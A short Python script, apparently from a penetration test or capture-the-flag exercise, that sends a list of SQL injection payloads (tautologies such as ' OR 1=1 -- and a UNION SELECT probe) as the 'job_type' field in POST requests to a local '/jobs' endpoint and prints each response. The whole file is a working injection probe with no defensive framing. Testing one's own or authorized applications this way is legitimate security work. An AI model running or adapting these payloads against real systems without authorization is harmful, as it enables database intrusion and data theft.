import requests
url = 'http://localhost:80/jobs'
for payload in ["' OR 1=1 -- ", "' OR '1'='1' -- ", "' OR 1=1/*", "' UNION SELECT 1,2,3,4 -- "]:
    try:
        r = requests.post(url, json={'job_type': payload}, timeout=10)
        print('Payload:', payload, 'Status:', r.status_code)
        print(r.text[:500])
        print('-'*60)
    except Exception as e:
        print('Error with payload', payload, e)
